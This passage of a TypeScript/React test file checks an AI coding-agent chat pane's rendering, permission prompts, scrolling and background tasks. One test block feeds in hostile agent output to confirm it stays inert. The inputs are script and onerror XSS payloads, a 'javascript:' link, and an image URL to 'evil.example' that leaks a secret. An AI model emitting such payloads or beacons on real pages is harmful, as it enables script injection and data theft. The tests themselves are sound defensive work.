    stream.events = [toolCall(0, {
      toolCallId: 't1',
      title: 'Read notes.md',
      kind: 'read',
      locations: [{ path: '/workspace/notes.md' }],
      content: [{ type: 'text', text: '```ts\nconst x = 1\n```\n' }],
    })]
    const { container } = show()
    fireEvent.click(screen.getByText('Read notes.md'))
    expect(container.querySelector('.diff-hl')?.textContent).toContain('```ts')
  })

  it('takes a read’s language from the fence when it has no path', () => {
    stream.events = [toolCall(0, {
      toolCallId: 't1',
      title: 'Read it',
      kind: 'read',
      content: [{ type: 'text', text: '```python\nimport os\n```\n' }],
    })]
    const { container } = show()
    fireEvent.click(screen.getByText('Read it'))
    expect(container.querySelector('.tok-keyword')?.textContent).toBe('import')
  })

  it('names each file when one call edits several', () => {
    stream.events = [toolCall(0, {
      toolCallId: 't1',
      title: 'Edit files',
      kind: 'edit',
      content: [
        { type: 'diff', path: '/workspace/a.ts', newText: 'aaa\n' },
        { type: 'diff', path: '/workspace/b.ts', newText: 'bbb\n' },
      ],
    })]
    show()
    expect(screen.getByText('a.ts')).toBeTruthy()
    expect(screen.getByText('b.ts')).toBeTruthy()
  })
})

/**
 * Agent output is untrusted: the model has been reading the repository. These
 * safety properties rest on react-markdown defaults (no `rehype-raw`, no
 * `urlTransform` prop, no image fetching), which a one-line change could
 * remove silently. These tests make such a change fail.
 */
describe('WorkspaceChat with hostile agent output', () => {
  const agent = (seq: number, text: string): AcpEvent =>
    ({ type: 'agent', seq, content: [{ type: 'text', text }] })

  beforeEach(() => {
    stream.events = []
    stream.busy = false
    stream.connected = true
    useUiStore.setState({ chatDrafts: {} })
  })

  afterEach(() => {
    cleanup()
    flushChatDrafts()
  })

  it('leaves raw HTML in a reply inert', () => {
    stream.events = [agent(0, 'look:\n\n<script>window.pwned = 1</script>\n\n<b onclick="x()">hi</b>\n')]
    const { container } = show()
    expect(container.querySelector('script')).toBeNull()
    expect(container.querySelector('b')).toBeNull()
    expect(container.querySelector('[onclick]')).toBeNull()
    // Not dropped either: it is shown as text.
    expect(container.textContent).toContain('<script>')
  })

  it('neutralizes a javascript: link', () => {
    stream.events = [agent(0, '[click](javascript:alert(1))\n')]
    const { container } = show()
    const link = container.querySelector('a')
    expect(link?.textContent).toBe('click')
    expect(link?.getAttribute('href') ?? '').not.toContain('javascript:')
  })

  it('shows a remote image as a link instead of fetching it', () => {
    // An `<img src>` makes a request on render with no click, which could leak
    // whatever the URL encodes.
    stream.events = [agent(0, '![a caption](https://evil.example/pixel?leak=secret)\n')]
    const { container } = show()
    expect(container.querySelector('img')).toBeNull()
    expect(screen.getByText('a caption')).toBeTruthy()
  })

  it('keeps tool output that breaks out of its fence inside the same sandbox', () => {
    // The adapter wraps stdout in a ```console fence, and stdout can contain
    // triple backticks, so output can become arbitrary markdown. It may look
    // odd but must not reach the DOM as markup.
    stream.events = [{
      type: 'tool',
      seq: 0,
      call: {
        toolCallId: 't1',
        title: 'cat evil.txt',
        kind: 'execute',
        status: 'completed',
        content: [{ type: 'text', text: '```console\n```\n\n<img src=x onerror="alert(1)">\n\n```\n' }],
      },
    }]
    const { container } = show()
    fireEvent.click(screen.getByText('cat evil.txt'))
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('[onerror]')).toBeNull()
  })
})

/**
 * Permission asks. The agent is blocked until a button is pressed, so the
 * tests check the answer reaches the socket and the card closes only when the
 * server confirms, not on the click.
 */
describe('WorkspaceChat permission asks', () => {
  const ask = (seq: number, requestId = '5'): AcpEvent => ({
    type: 'permission-request',
    seq,
    requestId,
    toolCall: {
      toolCallId: 'c1', title: 'rm -rf build', description: 'Clean the build output',
      shell: true, kind: 'execute', status: 'pending',
    },
    options: [
      { optionId: 'no', name: 'Deny', kind: 'reject_once' },
      { optionId: 'allow', name: 'Allow Once', kind: 'allow_once' },
    ],
  })

  beforeEach(() => {
    stream.events = []
    stream.busy = false
    stream.connected = true
    stream.send.mockClear()
    stream.send.mockReturnValue(true)
    useUiStore.setState({ chatDrafts: {} })
  })

  afterEach(() => {
    cleanup()
    flushChatDrafts()
  })

  it('offers one button per option, over the call being asked about', () => {
    stream.events = [ask(0)]
    show()
    // Show the actual command so the user can decide, not the model's
    // description of it.
    expect(screen.getByText('rm -rf build')).toBeTruthy()
    expect(screen.queryByText('Clean the build output')).toBeNull()
    expect(screen.getByRole('button', { name: 'Deny' })).toBeTruthy()
    expect(screen.getByRole('button', { name: 'Allow Once' })).toBeTruthy()
  })

  it('sends the chosen option and stops offering the rest', () => {
    stream.events = [ask(0)]
    show()
    fireEvent.click(screen.getByRole('button', { name: 'Allow Once' }))

    expect(stream.send).toHaveBeenCalledWith({
      type: 'permission', requestId: '5', optionId: 'allow',
    })
    // The card stays until the server confirms, but its buttons are disabled
    // while the answer is in flight.
    expect(screen.getByRole('button', { name: 'Allow Once' })).toHaveProperty('disabled', true)
    expect(screen.getByRole('button', { name: 'Deny' })).toHaveProperty('disabled', true)
  })

  it('sends a dismissal with no option, which the agent is told as cancelled', () => {
    stream.events = [ask(0)]
    show()
    fireEvent.click(screen.getByRole('button', { name: 'Dismiss' }))
    expect(stream.send).toHaveBeenCalledWith({ type: 'permission', requestId: '5' })
  })

  it('re-offers the buttons when the answer never left a dead socket', () => {
    stream.events = [ask(0)]
    stream.send.mockReturnValue(false)
    show()
    fireEvent.click(screen.getByRole('button', { name: 'Deny' }))
    // The send failed, so the question is still open.
    expect(screen.getByRole('button', { name: 'Deny' })).toHaveProperty('disabled', false)
  })

  it('collapses to the decision once the server reports it', () => {
    stream.events = [
      ask(0),
      { type: 'permission-resolved', seq: 1, requestId: '5', outcome: 'selected', optionId: 'allow' },
    ]
    show()
    expect(screen.queryByRole('button', { name: 'Allow Once' })).toBeNull()
    // The decision is shown, so a manual-mode transcript records it.
    expect(screen.getByText(/Allow Once/)).toBeTruthy()
  })

  it('says the agent is waiting on the user rather than working', () => {
    // A blocked turn is still `busy`, but "working" under a card asking the
    // user to act would mislead. The label's trailing dots are separate spans,
    // so match on the word alone.
    stream.events = [ask(0)]
    stream.busy = true
    show()
    expect(screen.queryByText('working')).toBeNull()

    cleanup()
    stream.events = [
      ask(0),
      { type: 'permission-resolved', seq: 1, requestId: '5', outcome: 'selected', optionId: 'allow' },
    ]
    show()
    expect(screen.getByText('working')).toBeTruthy()
  })
})

/**
 * Scroll position when the pane resizes. On a phone the soft keyboard shrinks
 * it when the user taps to reply. As with streaming, only a reader already at
 * the tail is kept at the tail.
 */
describe('WorkspaceChat scroll follow', () => {
  beforeEach(() => {
    stream.events = [user(0, 'hello')]
    stream.busy = false
    stream.connected = true
    useUiStore.setState({ chatDrafts: {} })
  })

  afterEach(() => {
    cleanup()
    flushChatDrafts()
    paneResized.clear()
  })

  /** jsdom does no layout, so the scroller's metrics are set by hand. The
   *  returned function reads the `scrollTop` the pane wrote. */
  function scroller(container: HTMLElement, clientHeight: number, scrollTop: number): () => number {
    const el = container.querySelector('.overflow-y-auto') as HTMLElement
    let top = scrollTop
    Object.defineProperty(el, 'scrollHeight', { get: () => 1000, configurable: true })
    Object.defineProperty(el, 'clientHeight', { get: () => clientHeight, configurable: true })
    Object.defineProperty(el, 'scrollTop', {
      get: () => top,
      set: (next: number) => { top = next },
      configurable: true,
    })
    return () => top
  }

  it('follows the tail when the pane shrinks under a reader who was at it', () => {
    const { container } = show()
    // The keyboard shrank the pane from 400px to 200px, pushing the bottom of
    // the conversation out of view.
    const top = scroller(container, 200, 600)
    for (const fire of paneResized) fire()
    expect(top()).toBe(1000)
  })

  it('leaves a reader who scrolled up where they were', () => {
    const { container } = show()
    const list = container.querySelector('.overflow-y-auto') as HTMLElement
    const top = scroller(container, 200, 0)
    // The reader scrolled up to an earlier tool call; the keyboard must not
    // jump them to the bottom.
    fireEvent.scroll(list)
    for (const fire of paneResized) fire()
    expect(top()).toBe(0)
  })
})

/**
 * A pane takes focus when shown, but not from an open dialog: an agent that
 * starts while the user types into the new-workspace dialog must leave the
 * keystrokes there.
 */
describe('WorkspaceChat focus', () => {
  beforeEach(() => {
    stream.events = []
    useUiStore.setState({ chatDrafts: {} })
  })

  afterEach(() => {
    cleanup()
    flushChatDrafts()
    document.body.replaceChildren()
  })

  it('focuses the box when shown', () => {
    show()
    expect(document.activeElement).toBe(box())
  })

  it('leaves focus in an open dialog', () => {
    const dialog = document.createElement('div')
    dialog.setAttribute('role', 'dialog')
    const prompt = document.createElement('textarea')
    dialog.append(prompt)
    document.body.append(dialog)
    prompt.focus()

    show()
    expect(document.activeElement).toBe(prompt)
  })
})

describe('WorkspaceChat subagents and background tasks', () => {
  const agent = (seq: number, text: string, thread?: string): AcpEvent =>
    ({ type: 'agent', seq, ...(thread !== undefined ? { thread } : {}), content: [{ type: 'text', text }] })
  const subagent = (seq: number, state: 'running' | 'completed'): AcpEvent => ({
    type: 'subagent', seq, subagent: { id: 'sub-1', name: 'Explore', task: 'find the router', state },
  })
  const shell = (seq: number, state: 'running' | 'stopped'): AcpEvent => ({
    type: 'task',
    seq,
    task: {
      id: 'b1', name: 'npm run dev', kind: 'shell', description: 'npm run dev', state, toolCallId: 't9',
      outputFile: '/tmp/c/tasks/b1.output', canStop: true,
    },
  })

  beforeEach(() => {
    stream.events = [
      agent(0, 'Delegating.'),
      subagent(1, 'running'),
      agent(2, 'Looked in src/router.ts.', 'sub-1'),
      {
        type: 'tool',
        seq: 3,
        call: {
          toolCallId: 't9', title: 'npm run dev', shell: true, description: 'start the dev server', kind: 'execute',
          status: 'completed',
        },
      },
      shell(4, 'running'),
    ]
    stream.busy = true
    stream.connected = true
    stream.taskOutputs = {}
    stream.send.mockClear()
    useUiStore.setState({ chatDrafts: {} })
  })

  afterEach(() => {
    cleanup()
    flushChatDrafts()
  })

  it('keeps a subagent\'s work out of the conversation, and shows it, without a composer, once opened', () => {
    show()
    expect(screen.queryByText('Looked in src/router.ts.')).toBeNull()
    // Running things are listed over the composer by category, as a TUI
    // lists them.
    const strip = screen.getByRole('group', { name: 'Running in the background' })
    expect(within(strip).getByRole('group', { name: 'Agents' }).textContent).toMatch(/^Agents 1/)
    expect(within(strip).getByRole('group', { name: 'Shells' }).textContent).toMatch(/^Shells 1/)
    fireEvent.click(within(strip).getByRole('button', { name: 'Agent: Explore' }))

    expect(screen.getByText('Looked in src/router.ts.')).toBeTruthy()
    expect(screen.getByText('find the router')).toBeTruthy()
    expect(screen.queryByText('Delegating.')).toBeNull()
    expect(screen.queryByRole('textbox')).toBeNull()

    // Esc goes back to the conversation and its composer.
    fireEvent.keyDown(window, { key: 'Escape' })
    expect(screen.getByText('Delegating.')).toBeTruthy()
    expect(box()).toBeTruthy()
  })

  it('opens a finished subagent from its card, though it has left the strip', () => {
    stream.events = [...stream.events, subagent(5, 'completed')]
    show()
    expect(screen.queryByTitle('Explore')).toBeNull()
    fireEvent.click(screen.getByRole('button', { name: /Explore/ }))
    expect(screen.getByText('Looked in src/router.ts.')).toBeTruthy()
    fireEvent.click(screen.getByRole('button', { name: /Back/ }))
    expect(screen.getByText('Delegating.')).toBeTruthy()
  })

  it('reads a background shell\'s output, with the command that started it, and stops it', () => {
    stream.taskOutputs = { b1: { text: '\u001b[32mready\u001b[0m on :3000' } }
    show()
    fireEvent.click(screen.getByTitle('npm run dev'))

    expect(stream.send).toHaveBeenCalledWith({ type: 'task-output', taskId: 'b1' })
    // Colors are stripped; the output is shown as text.
    expect(screen.getByText('ready on :3000')).toBeTruthy()
    // The starting call is open, so its command is in view, not just its description.
    expect(screen.getByText('start the dev server')).toBeTruthy()
    expect(screen.getByText((_, el) => el?.tagName === 'PRE' && el.textContent === '$ npm run dev')).toBeTruthy()

    fireEvent.click(screen.getByRole('button', { name: 'Stop' }))
    expect(stream.send).toHaveBeenCalledWith({ type: 'stop-task', taskId: 'b1' })
  })

  it('gives an ambient task a card that opens it, but no chip in the strip', () => {
    stream.events = [{
      type: 'task',
      seq: 0,
      task: {
        id: 'ws1', name: 'artifact updates', kind: 'monitor', description: 'artifact updates', state: 'running',
        ambient: true,
      },
    }]
    show()
    expect(screen.queryByRole('group', { name: 'Running in the background' })).toBeNull()
    fireEvent.click(screen.getByRole('button', { name: /^Monitorartifact updates/ }))
    expect(screen.getByRole('button', { name: /Back/ })).toBeTruthy()
  })

  it('groups an adapter\'s own task kind under its word, and an empty kind as a task', () => {
    stream.events = [
      { type: 'task', seq: 0, task: { id: 'k1', name: 'sync', kind: 'job', description: '', state: 'running' } },
      { type: 'task', seq: 1, task: { id: 'k2', name: 'mystery', kind: '', description: '', state: 'running' } },
    ]
    show()
    const strip = screen.getByRole('group', { name: 'Running in the background' })
    expect(within(strip).getByRole('group', { name: 'Jobs' }).textContent).toMatch(/^Jobs 1/)
    expect(within(strip).getByRole('button', { name: 'Task: mystery' })).toBeTruthy()
  })

  it('shows a task with no output file the output streamed onto its call, verbatim, without reading a file', () => {
    // codex has no output file; its shell's output arrives on the call.
    stream.events = [
      { type: 'tool', seq: 0, call: { toolCallId: 'exec-1', title: 'tick loop', kind: 'execute', status: 'in_progress' } },
      { type: 'tool-output', seq: 1, toolCallId: 'exec-1', data: '# tick 1\n' },
      { type: 'tool-output', seq: 2, toolCallId: 'exec-1', data: '__init__ 2' },
      { type: 'task', seq: 3, task: { id: 'exec-1', name: 'tick loop', kind: 'shell', description: '', state: 'running', toolCallId: 'exec-1' } },
    ]
    show()
    fireEvent.click(screen.getByRole('button', { name: /^Shelltick loop/ }))
    // Shown as text: `#` is no heading and `__init__` is not bold.
    expect(screen.getByText(/# tick 1\s+__init__ 2/)).toBeTruthy()
    expect(document.querySelector('h1, strong')).toBeNull()
    expect(stream.send).not.toHaveBeenCalledWith({ type: 'task-output', taskId: 'exec-1' })
    // Not every adapter can stop a task.
    expect(screen.queryByRole('button', { name: 'Stop' })).toBeNull()
  })

  it('shows a claude subagent\'s card in place of the Agent call that spawned it, and its report once it finishes', () => {
    stream.events = [
      { type: 'tool', seq: 0, call: { toolCallId: 'toolu_agent', title: 'count files', kind: 'think', status: 'pending' } },
      { type: 'subagent', seq: 1, subagent: { id: 'toolu_agent', name: 'count files', task: 'Run ls', state: 'running' } },
      { type: 'tool', seq: 2, thread: 'toolu_agent', call: { toolCallId: 'toolu_ls', title: 'ls docs', kind: 'execute', status: 'completed' } },
      // A background Agent call completes at once, with launch metadata.
      { type: 'tool', seq: 3, call: {
        toolCallId: 'toolu_agent', title: 'count files', kind: 'think', status: 'completed',
        content: [{ type: 'text', text: 'Async agent launched successfully.' }],
      } },
      {
        type: 'subagent',
        seq: 4,
        subagent: { id: 'toolu_agent', name: 'count files', task: 'Run ls', state: 'completed', summary: 'Found two files.' },
      },
    ]
    stream.busy = false
    show()
    // One card, no Agent row beside it.
    expect(screen.getAllByText('count files')).toHaveLength(1)
    expect(screen.queryByText('Found two files.')).toBeNull()
    fireEvent.click(screen.getByRole('button', { name: /^Agentcount files/ }))
    expect(screen.getByText('ls docs')).toBeTruthy()
    expect(screen.getByText('Found two files.')).toBeTruthy()
    expect(screen.queryByText(/Async agent launched/)).toBeNull()
  })

  it('keeps a call that started a running task marked running after its turn ends, not interrupted', () => {
    const call = { toolCallId: 'exec-1', title: 'tick loop', kind: 'execute' as const, status: 'in_progress' as const }
    const task = (seq: number, state: 'running' | 'stopped'): AcpEvent => ({
      type: 'task', seq, task: { id: 'exec-1', name: 'tick loop', kind: 'shell', description: '', state, toolCallId: 'exec-1' },
    })
    stream.events = [{ type: 'tool', seq: 0, call }, task(1, 'running'), { type: 'turn-end', seq: 2, stopReason: 'end_turn' }]
    stream.busy = false
    const { rerender } = show()
    expect(screen.queryByText('interrupted')).toBeNull()
    expect(screen.getAllByLabelText('running').length).toBeGreaterThan(0)

    // Once the task is over, a call never reported finished reads as before.
    stream.events = [...stream.events, task(3, 'stopped')]
    rerender(<WorkspaceChat workspaceId="w1" agentSessionId="acp-1" />)
    expect(screen.getByText('interrupted')).toBeTruthy()
  })

  it('offers no Stop for a task that has ended', () => {
    stream.events = [...stream.events, shell(5, 'stopped')]
    show()
    fireEvent.click(screen.getByRole('button', { name: /^Shellnpm run dev/ }))
    expect(screen.queryByRole('button', { name: 'Stop' })).toBeNull()
  })
})
